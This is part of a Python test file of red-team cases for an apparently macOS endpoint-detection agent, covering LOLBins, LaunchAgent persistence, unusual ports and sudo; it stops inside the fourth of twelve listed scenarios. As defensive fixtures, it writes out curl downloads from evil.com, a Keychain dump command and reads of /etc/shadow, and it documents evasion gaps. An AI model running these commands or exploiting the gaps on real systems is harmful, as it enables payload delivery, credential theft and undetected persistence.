"""macOS Observatory Red-Team Scenarios — adversarial testing for macOS agents.

12 scenarios covering all macOS Observatory agent domains, built from
Live Trigger Gauntlet golden fixtures (real macOS 26.0 test results).

Scenarios:
    1.  macos_lolbin_execution — LOLBin abuse (curl, osascript, nc, security)
    2.  macos_launchagent_persistence — LaunchAgent add/modify/remove
    3.  macos_non_standard_port — Service on unexpected port
    4.  macos_sudo_escalation — sudo privilege escalation
    5.  macos_removable_media — DMG/USB mount detection
    6.  macos_downloads_monitor — New file in ~/Downloads
    7.  macos_ssh_brute_force — SSH brute-force detection
    8.  macos_impossible_travel — SSH from different IPs rapidly
    9.  macos_credential_access — Keychain credential access
    10. macos_c2_beacon — C2 beaconing detection
    11. macos_critical_file — Critical system file modification
    12. macos_process_masquerade — Process name vs exe mismatch

Each scenario has 8 cases: mix of positive, evasion, benign.
Total: 96 adversarial cases.

MITRE coverage: T1218, T1059, T1543.001, T1571, T1548.003, T1091, T1204,
                T1110, T1078, T1555.001, T1071, T1565, T1036
"""

from __future__ import annotations

import os
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, List, Optional

from amoskys.agents.common.probes import Severity
from amoskys.agents.os.macos.auth.collector import AuthEvent
from amoskys.agents.os.macos.auth.probes import (
    CredentialAccessProbe,
    ImpossibleTravelProbe,
    SSHBruteForceProbe,
    SudoEscalationProbe,
)
from amoskys.agents.os.macos.filesystem.collector import FileEntry
from amoskys.agents.os.macos.filesystem.probes import (
    CriticalFileProbe,
    DownloadsMonitorProbe,
)
from amoskys.agents.os.macos.network.collector import Connection
from amoskys.agents.os.macos.network.probes import C2BeaconProbe, NonStandardPortProbe
from amoskys.agents.os.macos.peripheral.collector import PeripheralDevice
from amoskys.agents.os.macos.peripheral.probes import RemovableMediaProbe
from amoskys.agents.os.macos.persistence.collector import PersistenceEntry
from amoskys.agents.os.macos.persistence.probes import LaunchAgentProbe
from amoskys.agents.os.macos.process.collector import ProcessSnapshot
from amoskys.agents.os.macos.process.probes import LOLBinProbe, ProcessMasqueradeProbe
from amoskys.redteam.harness import AdversarialCase, Scenario
from amoskys.redteam.scenarios import register

# ─── Timestamp anchors ──────────────────────────────────────────────────────

_T0 = int(1_700_000_000 * 1e9)
_T1 = _T0 + int(5 * 1e9)
_T2 = _T0 + int(10 * 1e9)
_T3 = _T0 + int(15 * 1e9)
_NOW = datetime(2024, 11, 15, 2, 30, 0, tzinfo=timezone.utc)  # 2:30 AM (off-hours)
_BIZ = datetime(
    2024, 11, 15, 10, 30, 0, tzinfo=timezone.utc
)  # 10:30 AM (business hours)


# ─── Factory helpers ─────────────────────────────────────────────────────────


def _proc(
    pid: int = 1000,
    name: str = "test",
    exe: Optional[str] = None,
    cmdline: Optional[List[str]] = None,
    username: str = "testuser",
    ppid: int = 1,
    parent_name: str = "launchd",
    create_time: float = 1700000000.0,
    cpu_percent: Optional[float] = 0.0,
    memory_percent: Optional[float] = 0.1,
    status: str = "running",
    cwd: str = "/",
    environ: Optional[Dict[str, str]] = None,
    is_own_user: bool = True,
    process_guid: str = "test0000",
) -> ProcessSnapshot:
    """Shorthand ProcessSnapshot factory."""
    return ProcessSnapshot(
        pid=pid,
        name=name,
        exe=exe if exe is not None else f"/usr/bin/{name}",
        cmdline=cmdline if cmdline is not None else [name],
        username=username,
        ppid=ppid,
        parent_name=parent_name,
        create_time=create_time,
        cpu_percent=cpu_percent,
        memory_percent=memory_percent,
        status=status,
        cwd=cwd,
        environ=environ,
        is_own_user=is_own_user,
        process_guid=process_guid,
    )


def _pentry(
    category: str = "launchagent_user",
    path: str = "/tmp/test.plist",
    name: str = "test.plist",
    content_hash: str = "abc123",
    program: str = "/bin/sh",
    label: str = "com.test.agent",
    run_at_load: bool = True,
    keep_alive: bool = False,
    metadata: Optional[Dict[str, Any]] = None,
) -> PersistenceEntry:
    """Shorthand PersistenceEntry factory."""
    return PersistenceEntry(
        category=category,
        path=path,
        name=name,
        content_hash=content_hash,
        metadata=metadata or {},
        program=program,
        label=label,
        run_at_load=run_at_load,
        keep_alive=keep_alive,
    )


def _conn(
    pid: int = 2000,
    process_name: str = "sshd",
    user: str = "root",
    protocol: str = "TCP",
    local_addr: str = "0.0.0.0:22",
    remote_addr: str = "",
    state: str = "LISTEN",
    local_ip: str = "0.0.0.0",
    local_port: int = 22,
    remote_ip: str = "",
    remote_port: int = 0,
) -> Connection:
    """Shorthand Connection factory."""
    return Connection(
        pid=pid,
        process_name=process_name,
        user=user,
        protocol=protocol,
        local_addr=local_addr,
        remote_addr=remote_addr,
        state=state,
        local_ip=local_ip,
        local_port=local_port,
        remote_ip=remote_ip,
        remote_port=remote_port,
    )


def _auth(
    timestamp: Optional[datetime] = None,
    process: str = "sudo",
    message: str = "testuser : COMMAND=/bin/ls",
    category: str = "sudo",
    source_ip: Optional[str] = None,
    username: Optional[str] = "testuser",
    event_type: str = "success",
) -> AuthEvent:
    """Shorthand AuthEvent factory."""
    return AuthEvent(
        timestamp=timestamp or _NOW,
        process=process,
        message=message,
        category=category,
        source_ip=source_ip,
        username=username,
        event_type=event_type,
    )


def _volume(
    name: str = "USB_DRIVE",
    mount_point: str = "/Volumes/USB_DRIVE",
    device_type: str = "volume",
    vendor_id: str = "",
    product_id: str = "",
    serial: str = "",
    is_storage: bool = True,
    manufacturer: str = "",
    address: str = "",
    connected: bool = True,
) -> PeripheralDevice:
    """Shorthand PeripheralDevice factory for volumes."""
    return PeripheralDevice(
        device_type=device_type,
        name=name,
        vendor_id=vendor_id,
        product_id=product_id,
        serial=serial,
        is_storage=is_storage,
        mount_point=mount_point,
        manufacturer=manufacturer,
        address=address,
        connected=connected,
    )


def _file(
    path: str = "/Users/testuser/Downloads/test.txt",
    name: str = "test.txt",
    sha256: str = "deadbeef" * 8,
    mtime: float = 1700000000.0,
    size: int = 1024,
    mode: int = 0o100644,
    uid: int = 501,
    is_suid: bool = False,
) -> FileEntry:
    """Shorthand FileEntry factory."""
    return FileEntry(
        path=path,
        name=name,
        sha256=sha256,
        mtime=mtime,
        size=size,
        mode=mode,
        uid=uid,
        is_suid=is_suid,
    )


# =============================================================================
# 1. macOS LOLBin Execution (Process Observatory)
# =============================================================================

# Golden fixture: Live Trigger Gauntlet — curl, osascript, nc all detected

_LOLBIN_POS1_CURL = AdversarialCase(
    id="macos_lolbin_curl_download",
    title="curl downloads a file — LOLBin file_download",
    category="positive",
    description=(
        "Attacker uses curl to fetch a payload from a C2 server. "
        "curl is a macOS built-in LOLBin commonly used for initial access."
    ),
    why=(
        "curl is in _MACOS_LOLBINS as 'file_download'. Parent is 'python3' "
        "(not in _BENIGN_PARENTS), so the probe fires."
    ),
    events=[
        _proc(
            pid=31337,
            name="curl",
            exe="/usr/bin/curl",
            cmdline=["curl", "-o", "/tmp/payload.bin", "http://evil.com/stage2"],
            parent_name="python3",
            process_guid="curl0001",
        ),
    ],
    shared_data_key="processes",
    expect_count=1,
    expect_event_types=["lolbin_execution"],
    expect_severity=Severity.MEDIUM,
)

_LOLBIN_POS2_OSASCRIPT = AdversarialCase(
    id="macos_lolbin_osascript",
    title="osascript runs AppleScript — LOLBin applescript_execution",
    category="positive",
    description=(
        "Attacker uses osascript to execute AppleScript for UI manipulation, "
        "credential prompt spoofing, or persistence installation."
    ),
    why=(
        "osascript maps to 'applescript_execution' category. Parent is 'Google Chrome' "
        "(not in _BENIGN_PARENTS) — browser spawning osascript is suspicious."
    ),
    events=[
        _proc(
            pid=31338,
            name="osascript",
            exe="/usr/bin/osascript",
            cmdline=["osascript", "-e", 'display dialog "Enter password"'],
            parent_name="Google Chrome",
            process_guid="osa00001",
        ),
    ],
    shared_data_key="processes",
    expect_count=1,
    expect_event_types=["lolbin_execution"],
    expect_severity=Severity.MEDIUM,
)

_LOLBIN_POS3_SECURITY = AdversarialCase(
    id="macos_lolbin_security_keychain",
    title="security CLI accesses Keychain — LOLBin keychain_access HIGH",
    category="positive",
    description=(
        "Attacker uses the macOS `security` CLI to dump Keychain credentials. "
        "This is a HIGH severity LOLBin (keychain_access category)."
    ),
    why=(
        "'security' maps to 'keychain_access' — one of the elevated categories "
        "that triggers HIGH severity. Parent is 'python3' (not benign)."
    ),
    events=[
        _proc(
            pid=31339,
            name="security",
            exe="/usr/bin/security",
            cmdline=["security", "find-generic-password", "-a", "testuser"],
            parent_name="python3",
            process_guid="sec00001",
        ),
    ],
    shared_data_key="processes",
    expect_count=1,
    expect_event_types=["lolbin_execution"],
    expect_severity=Severity.HIGH,
)

_LOLBIN_EVA1_BENIGN_PARENT = AdversarialCase(
    id="macos_lolbin_benign_parent_terminal",
    title="curl from Terminal — benign parent, suppressed",
    category="evasion",
    description=(
        "Attacker runs curl from Terminal.app. The probe skips LOLBins "
        "spawned by known-benign parents to avoid flooding analysts."
    ),
    why=(
        "Terminal is in _BENIGN_PARENTS. The probe returns early when "
        "parent_name is in the whitelist. This is a known gap."
    ),
    events=[
        _proc(
            pid=31340,
            name="curl",
            exe="/usr/bin/curl",
            cmdline=["curl", "http://evil.com/payload"],
            parent_name="Terminal",
            process_guid="curl0002",
        ),
    ],
    shared_data_key="processes",
    expect_evades=True,
)

_LOLBIN_EVA2_RENAMED = AdversarialCase(
    id="macos_lolbin_renamed_binary",
    title="curl renamed to 'update' — name not in LOLBin list",
    category="evasion",
    description=(
        "Attacker copies /usr/bin/curl to /tmp/update and runs it. "
        "The process name 'update' is not in the LOLBin dictionary."
    ),
    why=(
        "LOLBin detection is name-based. A renamed binary evades because "
        "'update' is not in _MACOS_LOLBINS. Code signing or hash-based "
        "detection would be needed to catch this."
    ),
    events=[
        _proc(
            pid=31341,
            name="update",
            exe="/tmp/update",
            cmdline=["/tmp/update", "-o", "/tmp/payload", "http://evil.com/x"],
            parent_name="python3",
            process_guid="ren00001",
        ),
    ],
    shared_data_key="processes",
    expect_evades=True,
)

_LOLBIN_EVA3_BENIGN_PARENT_LAUNCHD = AdversarialCase(
    id="macos_lolbin_launchd_parent",
    title="launchctl from launchd — benign parent, suppressed",
    category="evasion",
    description=(
        "Attacker installs a LaunchAgent that runs launchctl. Since launchd "
        "is the parent, the LOLBin probe suppresses it."
    ),
    why=(
        "launchd is in _BENIGN_PARENTS. LaunchAgent-based persistence "
        "evades the LOLBin probe — caught instead by the persistence probes."
    ),
    events=[
        _proc(
            pid=31342,
            name="launchctl",
            exe="/bin/launchctl",
            cmdline=["launchctl", "load", "/tmp/evil.plist"],
            parent_name="launchd",
            process_guid="lctl0001",
        ),
    ],
    shared_data_key="processes",
    expect_evades=True,
)

_LOLBIN_BEN1_BREW = AdversarialCase(
    id="macos_lolbin_benign_tar_extract",
    title="tar from bash — normal archive extraction, benign parent",
    category="benign",
    description=(
        "Developer runs `tar xzf archive.tar.gz` from bash. "
        "bash is in _BENIGN_PARENTS, so the probe does not fire."
    ),
    why=(
        "bash/zsh/sh are in the benign parent whitelist. Normal developer "
        "CLI operations should not generate alerts."
    ),
    events=[
        _proc(
            pid=31343,
            name="tar",
            exe="/usr/bin/tar",
            cmdline=["tar", "xzf", "node_modules.tar.gz"],
            parent_name="bash",
            process_guid="tar00001",
        ),
    ],
    shared_data_key="processes",
    expect_count=0,
)

_LOLBIN_BEN2_NONLOLBIN = AdversarialCase(
    id="macos_lolbin_benign_ls",
    title="ls -- not a LOLBin, no alert",
    category="benign",
    description="User runs ls. ls is not in the LOLBin list.",
    why="Only binaries in _MACOS_LOLBINS trigger the probe.",
    events=[
        _proc(
            pid=31344,
            name="ls",
            exe="/bin/ls",
            cmdline=["ls", "-la", "/tmp"],
            parent_name="python3",
            process_guid="ls000001",
        ),
    ],
    shared_data_key="processes",
    expect_count=0,
)

MACOS_LOLBIN_SCENARIO: Scenario = register(
    Scenario(
        probe_id="macos_lolbin",
        agent="macos_process",
        name="macos_lolbin_execution",
        title="macOS LOLBin Execution: curl/osascript/security Abuse (T1218)",
        description=(
            "An attacker leverages macOS built-in binaries (living-off-the-land) "
            "to download payloads, execute scripts, and access Keychain credentials. "
            "Tests the LOLBinProbe against 27 categorized macOS LOLBins."
        ),
        mitre_techniques=["T1218", "T1059.002"],
        mitre_tactics=["defense_evasion", "execution"],
        probe_factory=LOLBinProbe,
        cases=[
            _LOLBIN_POS1_CURL,
            _LOLBIN_POS2_OSASCRIPT,
            _LOLBIN_POS3_SECURITY,
            _LOLBIN_EVA1_BENIGN_PARENT,
            _LOLBIN_EVA2_RENAMED,
            _LOLBIN_EVA3_BENIGN_PARENT_LAUNCHD,
            _LOLBIN_BEN1_BREW,
            _LOLBIN_BEN2_NONLOLBIN,
        ],
    )
)


# =============================================================================
# 2. macOS LaunchAgent Persistence
# =============================================================================

# Baseline entries — known LaunchAgents that should not trigger alerts
_LA_BASELINE = [
    _pentry(
        path=os.path.expanduser("~/Library/LaunchAgents/com.apple.Dock.plist"),
        name="com.apple.Dock.plist",
        content_hash="aaa111",
        label="com.apple.Dock",
        program="/System/Library/CoreServices/Dock.app/Contents/MacOS/Dock",
    ),
    _pentry(
        path=os.path.expanduser("~/Library/LaunchAgents/com.brave.Browser.plist"),
        name="com.brave.Browser.plist",
        content_hash="bbb222",
        label="com.brave.Browser",
        program="/Applications/Brave Browser.app/Contents/MacOS/Brave Browser",
    ),
]

# Attacker adds a malicious LaunchAgent
_LA_EVIL = _pentry(
    path=os.path.expanduser("~/Library/LaunchAgents/com.amoskys.trigger.test.plist"),
    name="com.amoskys.trigger.test.plist",
    content_hash="evil1234deadbeef",
    label="com.amoskys.trigger.test",
    program="/tmp/backdoor.sh",
    run_at_load=True,
    keep_alive=True,
)

# Modified version of a baseline LaunchAgent
_LA_MODIFIED = _pentry(
    path=os.path.expanduser("~/Library/LaunchAgents/com.apple.Dock.plist"),
    name="com.apple.Dock.plist",
    content_hash="modified_hash_999",  # Hash changed!
    label="com.apple.Dock",
    program="/tmp/injected_dock.sh",  # Program changed!
    run_at_load=True,
)

_LA_POS1_BASELINE = AdversarialCase(
    id="macos_la_baseline_setup",
    title="Baseline scan — learning phase, 0 events",
    category="positive",
    description="First scan establishes baseline of known LaunchAgents.",
    why="Baseline-diff probes silently learn on first run.",
    events=_LA_BASELINE,
    shared_data_key="entries",
    expect_count=0,
    stateful=True,
)

_LA_POS1_NEW = AdversarialCase(
    id="macos_la_new_agent_detected",
    title="New malicious LaunchAgent — HIGH severity",
    category="positive",
    description=(
        "Attacker drops a new LaunchAgent plist with RunAtLoad=true and "
        "KeepAlive=true pointing to /tmp/backdoor.sh."
    ),
    why=(
        "Path not in baseline → 'new' change type. RunAtLoad=true ensures "
        "the backdoor runs on login. LaunchAgent persistence is T1543.001."
    ),
    events=_LA_BASELINE + [_LA_EVIL],
    shared_data_key="entries",
    expect_count=1,
    expect_event_types=["macos_launchagent_new"],
    expect_severity=Severity.HIGH,
    stateful=True,
)

_LA_POS2_MODIFIED = AdversarialCase(
    id="macos_la_modified_agent",
    title="Modified existing LaunchAgent — HIGH severity",
    category="positive",
    description=(
        "Attacker modifies an existing LaunchAgent (com.apple.Dock) to point "
        "to a malicious program. Hash changes from baseline."
    ),
    why=(
        "Path exists in baseline but content_hash differs → 'modified'. "
        "Modifying a known plist is a stealthy persistence technique."
    ),
    events=[_LA_MODIFIED, _LA_BASELINE[1]],
    shared_data_key="entries",
    expect_count=1,
    expect_event_types=["macos_launchagent_modified"],
    expect_severity=Severity.HIGH,
    stateful=False,  # Fresh probe: baseline, then modify
)

# This case provides the baseline for the modify case above — note: need stateful chain
# Let's restructure: use a stateful chain for the modify test
_LA_POS2_BASELINE = AdversarialCase(
    id="macos_la_baseline_for_modify",
    title="Baseline scan (for modify test)",
    category="positive",
    description="Establish baseline with original Dock plist.",
    why="First scan learns the original hash.",
    events=_LA_BASELINE,
    shared_data_key="entries",
    expect_count=0,
    stateful=True,
)

_LA_POS2_FIRE = AdversarialCase(
    id="macos_la_modified_fires",
    title="Dock plist modified — program changed to /tmp/injected_dock.sh",
    category="positive",
    description="Dock LaunchAgent's program field is changed to a temp path.",
    why="Hash changed from baseline → modified event fires.",
    events=[_LA_MODIFIED, _LA_BASELINE[1]],
    shared_data_key="entries",
    expect_count=1,
    expect_event_types=["macos_launchagent_modified"],
    expect_severity=Severity.HIGH,
    stateful=True,
)

_LA_POS3_BASELINE = AdversarialCase(
    id="macos_la_baseline_for_remove",
    title="Baseline scan (for remove test)",
    category="positive",
    description="Baseline includes the evil LaunchAgent.",
    why="Need to learn the agent first so removal is detected.",
    events=_LA_BASELINE + [_LA_EVIL],
    shared_data_key="entries",
    expect_count=0,
    stateful=True,
)

_LA_POS3_REMOVED = AdversarialCase(
    id="macos_la_removed_agent",
    title="LaunchAgent removed — cleanup detected MEDIUM",
    category="positive",
    description=(
        "Attacker removes the malicious LaunchAgent after establishing "
        "persistence elsewhere (anti-forensics cleanup)."
    ),
    why=(
        "Path was in baseline but not in current scan → 'removed'. "
        "Removal detection catches attacker cleanup."
    ),
    events=_LA_BASELINE,  # Evil plist gone
    shared_data_key="entries",
    expect_count=1,
    expect_event_types=["macos_launchagent_removed"],
    expect_severity=Severity.MEDIUM,
    stateful=True,
)

_LA_EVA1_SYSTEM = AdversarialCase(
    id="macos_la_system_agent_evades",
    title="System LaunchAgent — different category, not caught by user probe",
    category="evasion",
    description=(
        "Attacker places a LaunchAgent in /Library/LaunchAgents/ (system-wide). "
        "The LaunchAgentProbe only watches 'launchagent_user' category."
    ),
    why=(
        "LaunchAgentProbe targets 'launchagent_user' and 'launchagent_system'. "
        "But if category is set to 'launchdaemon' it goes to a different probe."
    ),
    events=[
        _pentry(
            category="launchdaemon",
            path="/Library/LaunchDaemons/com.evil.daemon.plist",
            name="com.evil.daemon.plist",
            content_hash="daemon_evil_hash",
            label="com.evil.daemon",
            program="/tmp/rootkit",
            run_at_load=True,
        ),
    ],
    shared_data_key="entries",
    expect_evades=True,
)

_LA_EVA2_NO_CHANGE = AdversarialCase(
    id="macos_la_same_hash_evades",
    title="Same plist re-written with identical content — hash unchanged",
    category="evasion",
    description=(
        "Attacker overwrites a LaunchAgent with identical content. "
        "The hash doesn't change, so no modification is detected."
    ),
    why=(
        "Baseline-diff compares content_hash. If the attacker writes the "
        "same content, the hash is identical and no event fires."
    ),
    events=_LA_BASELINE,
    shared_data_key="entries",
    expect_evades=True,
    stateful=True,
)

_LA_BEN1_STABLE = AdversarialCase(
    id="macos_la_stable_no_change",
    title="All LaunchAgents unchanged — 0 events",
    category="benign",
    description="Normal operation: no LaunchAgents added, modified, or removed.",
    why="All paths and hashes match baseline. No changes = no alerts.",
    events=_LA_BASELINE,
    shared_data_key="entries",
    expect_count=0,
    stateful=True,
)

_LA_BEN2_EMPTY = AdversarialCase(
    id="macos_la_empty_entries",
    title="Empty entries list — 0 events",
    category="benign",
    description="Collector returns empty entries (e.g., permission denied).",
    why="No entries to compare against. Graceful empty handling.",
    events=[],
    shared_data_key="entries",
    expect_count=0,
)

MACOS_LAUNCHAGENT_SCENARIO: Scenario = register(
    Scenario(
        probe_id="macos_launchagent",
        agent="macos_persistence",
        name="macos_launchagent_persistence",
        title="macOS LaunchAgent Persistence: Add/Modify/Remove Detection (T1543.001)",
        description=(
            "An attacker installs a malicious LaunchAgent for persistence, then "
            "modifies an existing one, then cleans up. Tests baseline-diff "
            "detection for all three change types."
        ),
        mitre_techniques=["T1543.001"],
        mitre_tactics=["persistence", "privilege_escalation"],
        probe_factory=LaunchAgentProbe,
        cases=[
            # Stateful chain 1: baseline → new agent
            _LA_POS1_BASELINE,
            _LA_POS1_NEW,
            # Chain breaker (evasion: daemon, not agent category)
            _LA_EVA1_SYSTEM,
            # Stateful chain 2: baseline → modify
            _LA_POS2_BASELINE,
            _LA_POS2_FIRE,
            # Chain breaker (benign: empty list)
            _LA_BEN2_EMPTY,
            # Stateful chain 3: baseline with evil → remove
            _LA_POS3_BASELINE,
            _LA_POS3_REMOVED,
        ],
    )
)


# =============================================================================
# 3. macOS Non-Standard Port (Network Observatory)
# =============================================================================

_NSP_POS1_SSHD = AdversarialCase(
    id="macos_nsp_sshd_high_port",
    title="sshd listening on port 12345 — non-standard port MEDIUM",
    category="positive",
    description=(
        "sshd is normally expected on port 22. An attacker reconfigures sshd "
        "to listen on 12345 to evade network monitoring."
    ),
    why=(
        "sshd expected ports: {22}. Port 12345 is not in that set, "
        "triggering non_standard_port event."
    ),
    events=[
        _conn(
            pid=500,
            process_name="sshd",
            state="LISTEN",
            local_port=12345,
            local_addr="0.0.0.0:12345",
        ),
    ],
    shared_data_key="connections",
    expect_count=1,
    expect_event_types=["non_standard_port"],
    expect_severity=Severity.MEDIUM,
)

_NSP_POS2_MYSQL = AdversarialCase(
    id="macos_nsp_mysqld_wrong_port",
    title="mysqld listening on port 9306 — non-standard port",
    category="positive",
    description=(
        "mysqld standard ports are 3306/33060. Listening on 9306 indicates "
        "a potentially rogue database or C2 listener masquerading as MySQL."
    ),
    why="mysqld expected: {3306, 33060}. 9306 not in set → fires.",
    events=[
        _conn(
            pid=600,
            process_name="mysqld",
            state="LISTEN",
            local_port=9306,
            local_addr="0.0.0.0:9306",
        ),
    ],
    shared_data_key="connections",
    expect_count=1,
    expect_event_types=["non_standard_port"],
    expect_severity=Severity.MEDIUM,
)

_NSP_POS3_NGINX = AdversarialCase(
    id="macos_nsp_nginx_strange_port",
    title="nginx on port 4444 — classic reverse shell port",
    category="positive",
    description=(
        "nginx standard ports are 80/443/8080/8443. Port 4444 is a classic "
        "Metasploit reverse shell port."
    ),
    why="nginx expected: {80,443,8080,8443}. 4444 not in set → fires.",
    events=[
        _conn(
            pid=700,
            process_name="nginx",
            state="LISTEN",
            local_port=4444,
            local_addr="0.0.0.0:4444",
        ),
    ],
    shared_data_key="connections",
    expect_count=1,
    expect_event_types=["non_standard_port"],
    expect_severity=Severity.MEDIUM,
)

_NSP_EVA1_UNKNOWN_SERVICE = AdversarialCase(
    id="macos_nsp_unknown_service",
    title="Unknown process 'implant' on port 4444 — not in service map",
    category="evasion",
    description=(
        "Attacker runs a custom binary named 'implant' listening on 4444. "
        "The probe only checks processes in _STANDARD_SERVICE_PORTS."
    ),
    why=(
        "'implant' is not in the standard service ports mapping, so the "
        "probe has no baseline to compare against."
    ),
    events=[
        _conn(
            pid=800,
            process_name="implant",
            state="LISTEN",
            local_port=4444,
            local_addr="0.0.0.0:4444",
        ),
    ],
    shared_data_key="connections",
    expect_evades=True,
)

_NSP_EVA2_ESTABLISHED = AdversarialCase(
    id="macos_nsp_established_not_listen",
    title="sshd ESTABLISHED on port 12345 — only LISTEN checked",
    category="evasion",
    description=(
        "sshd has an established connection on a high port. The probe only "
        "checks LISTEN state connections."
    ),
    why="state != 'LISTEN' → skipped. Only listening services are checked.",
    events=[
        _conn(
            pid=500,
            process_name="sshd",
            state="ESTABLISHED",
            local_port=12345,
            local_addr="192.168.1.5:12345",
            remote_addr="10.0.0.1:54321",
            remote_ip="10.0.0.1",
            remote_port=54321,
        ),
    ],
    shared_data_key="connections",
    expect_evades=True,
)

_NSP_EVA3_RENAMED = AdversarialCase(
    id="macos_nsp_renamed_sshd",
    title="sshd renamed to 'httpd' on port 22 — wrong name, no mismatch",
    category="evasion",
    description=(
        "Attacker renames the sshd binary to 'httpd'. httpd on port 22 "
        "is not standard, but httpd's expected set doesn't include 22 — "
        "wait, that would actually fire. Let's make it a truly evasive case."
    ),
    why="Port 22 is not in httpd's expected set {80,443,8080,8443} — this fires!",
    # Actually this WOULD fire. Let's use a truly evasive case instead:
    # Attacker renames sshd to a name NOT in the service map.
    events=[
        _conn(
            pid=500,
            process_name="system_service",
            state="LISTEN",
            local_port=22,
            local_addr="0.0.0.0:22",
        ),
    ],
    shared_data_key="connections",
    expect_evades=True,
)

_NSP_BEN1_STANDARD = AdversarialCase(
    id="macos_nsp_sshd_standard",
    title="sshd on port 22 — standard port, no alert",
    category="benign",
    description="sshd listening on its standard port 22.",
    why="22 is in sshd's expected ports {22}. No mismatch → no event.",
    events=[
        _conn(
            pid=500,
            process_name="sshd",
            state="LISTEN",
            local_port=22,
            local_addr="0.0.0.0:22",
        ),
    ],
    shared_data_key="connections",
    expect_count=0,
)

_NSP_BEN2_NONSERVICE = AdversarialCase(
    id="macos_nsp_node_custom_port",
    title="node on port 3000 — not in service map, no alert",
    category="benign",
    description="Node.js dev server on port 3000. Not a monitored service.",
    why="'node' not in _STANDARD_SERVICE_PORTS → not checked.",
    events=[
        _conn(
            pid=900,
            process_name="node",
            state="LISTEN",
            local_port=3000,
            local_addr="127.0.0.1:3000",
        ),
    ],
    shared_data_key="connections",
    expect_count=0,
)

MACOS_NON_STANDARD_PORT_SCENARIO: Scenario = register(
    Scenario(
        probe_id="macos_non_standard_port",
        agent="macos_network",
        name="macos_non_standard_port",
        title="macOS Non-Standard Port: Service Port Mismatch Detection (T1571)",
        description=(
            "An attacker reconfigures standard services to listen on unusual ports, "
            "or runs C2 listeners on known-service ports. Tests the NonStandardPort "
            "probe against the standard service port mapping."
        ),
        mitre_techniques=["T1571"],
        mitre_tactics=["command_and_control"],
        probe_factory=NonStandardPortProbe,
        cases=[
            _NSP_POS1_SSHD,
            _NSP_POS2_MYSQL,
            _NSP_POS3_NGINX,
            _NSP_EVA1_UNKNOWN_SERVICE,
            _NSP_EVA2_ESTABLISHED,
            _NSP_EVA3_RENAMED,
            _NSP_BEN1_STANDARD,
            _NSP_BEN2_NONSERVICE,
        ],
    )
)


# =============================================================================
# 4. macOS Sudo Escalation (Auth Observatory)
# =============================================================================

_SUDO_POS1_SUCCESS = AdversarialCase(
    id="macos_sudo_success",
    title="sudo ls / — successful privilege escalation MEDIUM",
    category="positive",
    description=(
        "User runs `sudo ls /`. This is a legitimate sudo usage but the probe "
        "records all sudo escalations for forensic visibility."
    ),
    why=(
        "category=='sudo' and event_type=='success' → sudo_escalation event. "
        "MEDIUM severity because successful sudo is common but noteworthy."
    ),
    events=[
        _auth(
            message="testuser : TTY=ttys001 ; PWD=/Users/testuser ; USER=root ; COMMAND=/bin/ls /",
            event_type="success",
            username="testuser",
        ),
    ],
    shared_data_key="auth_events",
    expect_count=1,
    expect_event_types=["sudo_escalation"],
    expect_severity=Severity.MEDIUM,
)

_SUDO_POS2_FAILURE = AdversarialCase(
    id="macos_sudo_failure",
    title="sudo with wrong password — escalation failure HIGH",
    category="positive",
    description=(
        "Attacker runs `sudo -n ls /` without cached credentials. "
        "Failed sudo attempts are HIGH severity — credential guessing."
    ),
    why=(
        "category=='sudo' and event_type=='failure' → sudo_escalation_failure. "
        "HIGH severity because failed sudo may indicate unauthorized attempts."
    ),
    events=[
        _auth(
            message="testuser : a password is required ; COMMAND=/bin/ls /",
            event_type="failure",
            username="testuser",
        ),
    ],
    shared_data_key="auth_events",
    expect_count=1,
    expect_event_types=["sudo_escalation_failure"],
    expect_severity=Severity.HIGH,
)

_SUDO_POS3_MULTI = AdversarialCase(
    id="macos_sudo_multiple",
    title="Three sudo commands — three events",
    category="positive",
    description=(
        "Attacker runs multiple sudo commands in rapid succession: "
        "ls, cat /etc/shadow, chmod 777 /etc/passwd."
    ),
    why="Each sudo event generates an independent TelemetryEvent.",
    events=[
        _auth(
            message="attacker : TTY=ttys001 ; COMMAND=/bin/ls /",
            event_type="success",
            username="attacker",
        ),
        _auth(
            message="attacker : TTY=ttys001 ; COMMAND=/bin/cat /etc/shadow",
            event_type="success",
            username="attacker",
        ),
        _auth(
            message="attacker : a password is required ; COMMAND=/bin/chmod 777 /etc/passwd",
            event_type="failure",
            username="attacker",
        ),
    ],
    shared_data_key="auth_events",
    expect_count=3,
    expect_event_types=[
        "sudo_escalation",
        "sudo_escalation",
        "sudo_escalation_failure",
    ],
)

_SUDO_EVA1_SSH = AdversarialCase(
    id="macos_sudo_ssh_not_sudo",
    title="SSH login (not sudo) — different category, not caught",
    category="evasion",
    description="SSH login event. SudoEscalationProbe only watches sudo category.",
    why="ev.category != 'sudo' → skipped.",
    events=[
        _auth(
            process="sshd",
            message="Accepted publickey for admin from 10.0.0.1 port 54321",
            category="ssh",
            event_type="success",
            username="admin",
            source_ip="10.0.0.1",
        ),
    ],
    shared_data_key="auth_events",
    expect_evades=True,
)

_SUDO_EVA2_SCREENSAVER = AdversarialCase(
    id="macos_sudo_screensaver_not_sudo",
    title="Screensaver unlock — not a sudo event",
    category="evasion",
    description="Screensaver unlock is auth but not sudo escalation.",
    why="category is 'screensaver', not 'sudo' → skipped.",
    events=[
        _auth(
            process="screensaverengine",
            message="user authenticated",
            category="screensaver",
            event_type="unlock",
            username="testuser",
        ),
    ],
    shared_data_key="auth_events",
    expect_evades=True,
)

_SUDO_EVA3_ATTEMPT = AdversarialCase(
    id="macos_sudo_attempt_only",
    title="sudo 'attempt' event — neither success nor failure",
    category="evasion",
    description=(
        "Some sudo log entries have event_type='attempt' (initial log message). "
        "The probe only fires on 'success' or 'failure'."
    ),
    why="event_type is 'attempt', not 'success' or 'failure' → skipped.",
    events=[
        _auth(
            message="sudo: testuser : 3 incorrect password attempts",
            event_type="attempt",
            username="testuser",
        ),
    ],
    shared_data_key="auth_events",
    expect_evades=True,
)

_SUDO_BEN1_EMPTY = AdversarialCase(
    id="macos_sudo_no_events",
    title="No auth events — 0 events",
    category="benign",
    description="No sudo events in the collection window.",
    why="Empty auth_events list → no iteration → 0 events.",
    events=[],
    shared_data_key="auth_events",
    expect_count=0,
)

_SUDO_BEN2_LOGIN_ONLY = AdversarialCase(
    id="macos_sudo_login_only",
    title="loginwindow events only — no sudo",
    category="benign",
    description="Only loginwindow events present. No sudo activity.",
    why="category is 'login', not 'sudo' → all events skipped.",
    events=[
        _auth(
            process="loginwindow",
            message="user testuser login",
            category="login",
            event_type="success",
            username="testuser",
            timestamp=_BIZ,
        ),
    ],
    shared_data_key="auth_events",
    expect_count=0,
